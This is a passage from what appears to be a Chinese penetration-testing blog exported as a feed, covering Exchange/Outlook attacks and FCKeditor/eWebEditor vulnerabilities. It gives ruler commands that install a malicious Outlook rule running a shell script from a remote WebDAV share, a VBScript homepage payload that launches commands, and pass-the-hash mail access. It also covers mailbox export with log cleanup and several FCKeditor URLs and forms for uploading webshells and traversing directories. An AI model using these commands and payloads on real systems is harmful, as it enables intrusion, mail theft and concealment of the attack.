class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><br>data=client.get_unc_file(<span class="hljs-string">r&#x27;\\dc1\SYSVOL\test.com\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\GPT.INI&#x27;</span>)<br>print(data)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>注：</p><p>访问域内共享目录SYSVOL时，路径要加上域控制器的计算机名，而不是域名</p><p>正确的写法：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\\</span>dc1<span class="hljs-symbol">\S</span>YSVOL<span class="hljs-symbol">\t</span>est.com<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\&#123;</span>6AC1786C-016F-11D2-945F-00C04fB984F9&#125;<span class="hljs-symbol">\G</span>PT.INI<br></code></pre></td></tr></table></figure><p>错误的写法：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\\</span>test.com<span class="hljs-symbol">\S</span>YSVOL<span class="hljs-symbol">\t</span>est.com<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\&#123;</span>6AC1786C-016F-11D2-945F-00C04fB984F9&#125;<span class="hljs-symbol">\G</span>PT.INI<br></code></pre></td></tr></table></figure><p>如果掌握了域控制器的计算机名，可以通过Exchange ActiveSync从外网访问域内共享目录SYSVOL中的文件</p></li></ul><h2 id="OUTLOOK-攻击"><a href="#OUTLOOK-攻击" class="headerlink" title="OUTLOOK 攻击"></a>OUTLOOK 攻击</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>outlook允许用户设定规则，在收到特定邮件时执行某动作，执行动作可以是一个可执行文件，但是不可以传参（例如 x.exe -c xxx）。</p><p>可以利用ruler来设置规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看规则</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug display<br><br><span class="hljs-comment"># 增加规则，收到含有 popashell 的邮件时执行共享内的文件</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug add —location “\\VPS\webdav\shell.bat” —trigger “popashell” —name maliciousrule<br><br><span class="hljs-comment"># 利用ruler发送邮件给自己</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug send —subject popashell —body “this is a <span class="hljs-built_in">test</span> by daiker”<br><br><span class="hljs-comment"># 删除规则</span><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug delete —id 020000006cfcd8d7<br></code></pre></td></tr></table></figure><h3 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h3><p>outlook允许用户加载外部url渲染主页，攻击者可以提交包含恶意代码的主页</p><p>同样可利用ruler</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage display<br><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage add —url http://x<br><br>ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage delete<br></code></pre></td></tr></table></figure><p>主页内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Language&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;en-us&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=windows-1252&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Outlook<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">clientEventHandlersVBS</span> <span class="hljs-attr">language</span>=<span class="hljs-string">vbscript</span>&gt;</span><br>&lt;!--<br> Sub window_onload()<br><span class="javascript">     <span class="hljs-built_in">Set</span> Application = ViewCtl1.OutlookApplication</span><br><span class="javascript">     <span class="hljs-built_in">Set</span> cmd = Application.CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="javascript">     cmd.Run(<span class="hljs-string">&quot;calc&quot;</span>)</span><br> End Sub<br>--&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;clsid:0006F063-0000-0000-C000-000000000046&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ViewCtl1&quot;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="邮件操作"><a href="#邮件操作" class="headerlink" title="邮件操作"></a>邮件操作</h2><h3 id="pass-hash-to-ews"><a href="#pass-hash-to-ews" class="headerlink" title="pass_hash_to_ews"></a>pass_hash_to_ews</h3><p><a href="https://github.com/pentest-tools-public/Pass-to-hash-EWS">https://github.com/pentest-tools-public/Pass-to-hash-EWS</a></p><p>保存在目录下的inbox文件夹中为eml格式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pth_to_ews.exe https:<span class="hljs-regexp">//</span>MAIL<span class="hljs-regexp">/ews/</span>exchange.asmx  -U daiker -P 密码  -MType Inbox<br></code></pre></td></tr></table></figure><p>发送邮件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pth_to_ews.exe https:<span class="hljs-regexp">//</span>MAIL<span class="hljs-regexp">/ews/</span>exchange.asmx -U daiker -P 密码 -Sendmail -T <span class="hljs-string">&quot;123&quot;</span> -TM zhangjiawei1@Liton-Lab.com -B HTML.txt<br></code></pre></td></tr></table></figure><p>搜索邮件内容含有ACL的邮件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pth_to_ews.exe https:<span class="hljs-regexp">//</span>MAIL<span class="hljs-regexp">/ews/</span>exchange.asmx  -U daiker -P 密码 -MType SentItems -Filterstring <span class="hljs-string">&quot;ACL&quot;</span> 搜索ACL<br></code></pre></td></tr></table></figure><p>ews接口是基于http的，所以可以利用白银票据伪造http服务以任意用户身份访问，具体操作ews访问exchange资源，可以看：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service/</a></p><h2 id="导出邮件"><a href="#导出邮件" class="headerlink" title="导出邮件"></a>导出邮件</h2><h3 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h3><ul><li><p>本地导出</p><p>指定导出pst</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -PSConsoleFile <span class="hljs-string">&quot;C:\Program Files\Microsoft\Exchange Server\V15\Bin\exshell.psc1&quot;</span> <span class="hljs-string">&quot;New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST&quot;</span><br><br></code></pre></td></tr></table></figure><p>按时间,导出 2018 年 1 月 15 日之后的邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -PSConsoleFile <span class="hljs-string">&quot;C:\Program Files\Microsoft\Exchange Server\V15\Bin\exshell.psc1&quot;</span> <span class="hljs-string">&quot;New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST -ContentFilter &#123;(Received -gt &#x27;01/15/2018&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>按时间导出 PST，导出 2018 年 1 月 15 日到 2019 年 2 月 12 日之间的邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -PSConsoleFile <span class="hljs-string">&quot;C:\Program Files\Microsoft\Exchange Server\V15\Bin\exshell.psc1&quot;</span> <span class="hljs-string">&quot;New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST -ContentFilter &#123;(Received -gt &#x27;01/15/2018&#x27;) -and (Received -lt &#x27;2/12/2019&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>远程导出</p><p>认证并导出指定账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$Credential</span> = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;EXCHLAB\Administrator&#x27;</span>,(ConvertTo-SecureString -String <span class="hljs-string">&#x27;VMPassw0rd!!&#x27;</span> -AsPlainText -Force)); <br><span class="hljs-variable">$Session</span> = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://EXCH.EXCHLAB.ORG/PowerShell/ -Authentication Kerberos -Credential <span class="hljs-variable">$Credential</span>;<br>Import-PSSession <span class="hljs-variable">$Session</span>;<br>New-MailboxExportRequest -Mailbox accountname -FilePath \\EXCHANGESERVER\C$\Windows\Temp\OUTPUT.PST<br>Remove-PSSession <span class="hljs-variable">$Session</span>;<br></code></pre></td></tr></table></figure></li><li><p>删除记录（ps导出邮件是会留下记录的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:<span class="hljs-variable">$FALSE</span><br></code></pre></td></tr></table></figure><h3 id="pth-outlook"><a href="#pth-outlook" class="headerlink" title="pth-outlook"></a>pth-outlook</h3></li></ul><p>本地通过pth导入用户hash</p><p>exchange新建用户时选择ntlm认证即可</p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>并不全的编辑器漏洞</title>
    <link href="/2021/02/03/editor/"/>
    <url>/2021/02/03/editor/</url>
    
    <content type="html"><![CDATA[<h1 id="Editor-Vuln"><a href="#Editor-Vuln" class="headerlink" title="Editor Vuln"></a>Editor Vuln</h1><h2 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h2><h3 id="FCKeditor-编辑器页"><a href="#FCKeditor-编辑器页" class="headerlink" title="FCKeditor 编辑器页"></a>FCKeditor 编辑器页</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/_samples/</span><span class="hljs-keyword">default</span>.html<br>FCKeditor<span class="hljs-regexp">/_samples/</span><span class="hljs-keyword">default</span>.html<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample01.asp<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample02.asp<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample03.asp<br>FCKeditor<span class="hljs-regexp">/_samples/</span>asp/sample04.asp<br>fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.html<br></code></pre></td></tr></table></figure><h3 id="FCKeditor-查看编辑器版本"><a href="#FCKeditor-查看编辑器版本" class="headerlink" title="FCKeditor 查看编辑器版本"></a>FCKeditor 查看编辑器版本</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">FCKeditor/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_whatsnew</span>.</span></span>html<br></code></pre></td></tr></table></figure><p><strong>FCKeditor V2.43 版本</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>php/config.php<br></code></pre></td></tr></table></figure><p><strong>FCKeditor V2.6.6版本</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>asp/config.php<br></code></pre></td></tr></table></figure><h3 id="FCKeditor-匿名上传文件"><a href="#FCKeditor-匿名上传文件" class="headerlink" title="FCKeditor 匿名上传文件"></a>FCKeditor 匿名上传文件</h3><p>影响版本:非优化/精简版本的FCKeditor<br>脆弱描述：<br>如果存在以下文件，打开后即可上传文件。<br>攻击利用:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/upload/</span>test.html<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>test.html<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>jsp/connector<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.html<br>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/u</span>ploadtest.html<br></code></pre></td></tr></table></figure><h3 id="FCKeditor-查看文件上传路径"><a href="#FCKeditor-查看文件上传路径" class="headerlink" title="FCKeditor 查看文件上传路径"></a>FCKeditor 查看文件上传路径</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></code></pre></td></tr></table></figure><p>XML页面中第二行 <code>url=/xxx</code>的部分就是默认基准上传路径</p><h3 id="FCKeditor被动限制策略所导致的过滤不严问题"><a href="#FCKeditor被动限制策略所导致的过滤不严问题" class="headerlink" title="FCKeditor被动限制策略所导致的过滤不严问题"></a>FCKeditor被动限制策略所导致的过滤不严问题</h3><p>影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3</p><p>脆弱描述：</p><p>FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|<br>pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm</p><p>Fckeditor 2.0 &lt;= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件上传后 它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension为后缀。直接导致在win下在上传文件后面加个<code>.</code>来突破[未测试]。而在apache下，因为”Apache文件名解析缺陷漏洞”也可以利用之，详见”附录A”</p><p>另建议其他上传漏洞中定义TYPE变量时使用File类别来上传文件,根据FCKeditor的代码，其限制最为狭隘。</p><p>攻击利用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">允许其他任何后缀上传<br></code></pre></td></tr></table></figure><h3 id="利用2003路径解析漏洞上传木马"><a href="#利用2003路径解析漏洞上传木马" class="headerlink" title="利用2003路径解析漏洞上传木马"></a>利用2003路径解析漏洞上传木马</h3><p>影响版本: 索引底部附录B</p><p>脆弱描述：<br>利用2003系统路径解析漏洞的原理，创建类似<code>bin.asp</code>如此一般的目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。</p><p>攻击利用:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>asp/connector.asp<br></code></pre></td></tr></table></figure><p>强制建立shell.asp目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/</span>shell.asp&amp;NewFolderName=z&amp;uuid=<span class="hljs-number">1244789975684</span><br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=CreateFolder&amp;CurrentFolder=/</span>&amp;Type=Image&amp;NewFolderName=shell.asp<br></code></pre></td></tr></table></figure><p>**FCKeditor PHP上传任意文件漏洞<br>**</p><p>影响版本: FCKeditor 2.2 &lt;= FCKeditor 2.4.2</p><p>脆弱描述：</p><p>FCKeditor在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。</p><p>在通过editor/filemanager/upload/php/upload.php上传文件时攻击者可以通过为Type参数定义无效的值导致上传任意脚本。</p><p>成功攻击要求config.php配置文件中启用文件上传，而默认是禁用的。攻击利用: (请修改action字段为指定网址)：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span> id=<span class="hljs-string">&quot;frmUpload&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span><br>action=<span class="hljs-string">&quot;http://www.xxxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;Upload a new <span class="hljs-keyword">file</span>:&lt;<span class="hljs-keyword">br</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;NewFile&quot;</span> size=<span class="hljs-string">&quot;50&quot;</span>&gt;&lt;<span class="hljs-keyword">br</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> id=<span class="hljs-string">&quot;btnUpload&quot;</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;<br>&lt;/<span class="hljs-keyword">form</span>&gt;<br></code></pre></td></tr></table></figure><p>Note:如想尝试v2.2版漏洞，则修改Type=任意值 即可，但注意，如果换回使用Media则必须大写首字母M,否则LINUX下，FCKeditor会对文件目录进行文件名校验，不会上传成功的。</p><h3 id="FCKeditor-暴路径漏洞"><a href="#FCKeditor-暴路径漏洞" class="headerlink" title="FCKeditor 暴路径漏洞"></a>FCKeditor 暴路径漏洞</h3><p>影响版本：aspx版FCKeditor<br>攻击利用：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/</span><span class="hljs-number">1</span>.asp<br></code></pre></td></tr></table></figure><h3 id="FCKeditor-文件上传“-”变“-”下划线的绕过方法"><a href="#FCKeditor-文件上传“-”变“-”下划线的绕过方法" class="headerlink" title="FCKeditor 文件上传“.”变“_”下划线的绕过方法"></a>FCKeditor 文件上传“.”变“_”下划线的绕过方法</h3><p>影响版本: FCKeditor =&gt; 2.4.x</p><p>脆弱描述：</p><p>我们上传的文件例如：shell.php.rar或shell.php;.jpg会变为shell_php;.jpg这是新版FCK的变化。</p><p>攻击利用:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">提交1<span class="hljs-selector-class">.php</span>+空格 就可以绕过去所有的,<br></code></pre></td></tr></table></figure><p>※不过空格只支持win系统 *nix是不支持的[1.php和1.php+空格是2个不同的文件]</p><p>Note:<a href="http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html">http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html</a></p><h3 id="FCKeditor-文件上传“-”变“-”下划线的绕过方法（二）"><a href="#FCKeditor-文件上传“-”变“-”下划线的绕过方法（二）" class="headerlink" title="FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）"></a>FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）</h3><p>影响版本:=&gt;2.4.x的最新版已修补</p><p>脆弱描述:</p><p>由于Fckeditor对第一次上传123.asp;123.jpg 这样的格式做了过滤。也就是IIS6解析漏洞。</p><p>上传第一次。被过滤为123_asp;123.jpg 从而无法运行。<br>但是第2次上传同名文件123.asp;123.jpg后。由于”123_asp;123.jpg”已经存在。<br>文件名被命名为123.asp;123(1).jpg …… 123.asp;123(2).jpg这样的编号方式。<br>所以。IIS6的漏洞继续执行了。</p><p>如果通过上面的步骤进行测试没有成功，可能有以下几方面的原因：</p><p>1.FCKeditor没有开启文件上传功能，这项功能在安装FCKeditor时默认是关闭的。如果想上传文件，FCKeditor会给出错误提示。</p><p>2.网站采用了精简版的FCKeditor，精简版的FCKeditor很多功能丢失，包括文件上传功能。</p><p>3.FCKeditor的这个漏洞已经被修复。</p><h3 id="FCKeditor-新闻组件遍历目录漏洞"><a href="#FCKeditor-新闻组件遍历目录漏洞" class="headerlink" title="FCKeditor 新闻组件遍历目录漏洞"></a>FCKeditor 新闻组件遍历目录漏洞</h3><p>影响版本:Aspx与JSP版FCKeditor</p><p>脆弱描述：</p><p>如何获得webshell请参考上文“TYPE自定义变量任意上传文件漏洞”<br>攻击利用:<br>修改CurrentFolder参数使用 ../../来进入不同的目录</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../</span>../..%<span class="hljs-number">2</span>F&amp;NewFolderName=aspx.asp<br></code></pre></td></tr></table></figure><p>根据返回的XML信息可以查看网站所有的目录。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%<span class="hljs-number">2</span>F<br><br><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%<span class="hljs-number">2</span>F<br></code></pre></td></tr></table></figure><h3 id="TYPE自定义变量任意上传文件漏洞"><a href="#TYPE自定义变量任意上传文件漏洞" class="headerlink" title="TYPE自定义变量任意上传文件漏洞"></a>TYPE自定义变量任意上传文件漏洞</h3><p>影响版本: 较早版本</p><p>脆弱描述：</p><p>通过自定义Type变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。</p><p>攻击利用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/FCKeditor/</span>editor<span class="hljs-regexp">/filemanager/</span>browser<span class="hljs-regexp">/default/</span>browser.html?Type=all&amp;Connector=connectors<span class="hljs-regexp">/asp/</span>connector.asp<br></code></pre></td></tr></table></figure><p>打开这个地址就可以上传任何类型的文件了，Shell上传到的默认位置是:<br><strong><a href="http://www.xxxx.com/UserFiles/all/1.asp">http://www.xxxx.com/UserFiles/all/1.asp</a></strong><br><code>Type=all</code> 这个变量是自定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.</p><p>比如输入:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/FCKeditor/</span>editor<span class="hljs-regexp">/filemanager/</span>browser<span class="hljs-regexp">/default/</span>browser.html?Type=..<span class="hljs-regexp">/&amp;Connector=connectors/</span>asp/connector.asp<br></code></pre></td></tr></table></figure><p>网马就可以传到网站的根目录下.</p><p>Note:如找不到默认上传文件夹可检查此文件:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></code></pre></td></tr></table></figure><h2 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h2><h3 id="eWebEditor-基础知识"><a href="#eWebEditor-基础知识" class="headerlink" title="eWebEditor 基础知识"></a>eWebEditor 基础知识</h3><p>默认后台地址：<br>/ewebeditor/admin_login.asp<br>/WebEdior/admin/login.aspx<br>建议最好检测下admin_style.asp文件是否可以直接访问</p><p>默认数据库路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">[PATH]<span class="hljs-regexp">/db/</span>ewebeditor.mdb<br>[PATH]<span 